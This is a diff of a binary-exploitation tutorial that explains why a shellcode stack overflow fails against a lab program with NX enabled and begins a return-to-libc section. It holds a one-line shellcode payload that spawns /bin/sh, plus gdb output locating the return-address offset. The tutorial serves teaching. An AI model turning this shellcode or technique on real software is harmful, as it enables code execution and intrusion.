@@ -50,7 +50,7 @@ $ w
 [*] Got EOF while sending in interactive
 ```
 
-Okay, now exploit is broken. Let's try without script:
+Okay, you can see that the NX option is enabled as `checksec` said. And exploit is broken. Let's try without script:
 ```bash
 $ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\x36\xcf\xff\xff"'; cat) | ./stack-overflow-with-nx
 
@@ -126,6 +126,21 @@ Start      End        Offset     Perm Path
 0xfffdd000 0xffffe000 0x00000000 rw- [stack]
 ```
 
-Even, if you will jump to the right address the program will not execute it.
+Even, if you will jump to the right address the program will not execute it, because you can see that the stack hasn't an X flag.
 
-But, it doesn't mean that you can't exploit it now.
+But, it doesn't mean that you can't exploit it now. You can apply two exploitation techniques here: `Return to libc attack(ret2libc)` and `Return-Oriented programming(ROP)`.
+
+### Return to libc attack
+
+This attack includes searching addresses of useful functions within libc.
+
+Again, consider our old stack-overflow program and determine the offset to return address within gdb:
+```bash
+gef➤  r < <(python -c 'print "A"*262 + "B"*4')
+Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx < <(python -c 'print "A"*262 + "B"*4')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```
+
+Now, find addresses within libc. An easy and always useful function to use in the exploit is a `system`, then, you need string `/bin/sh` as an argument to it and last function exit.
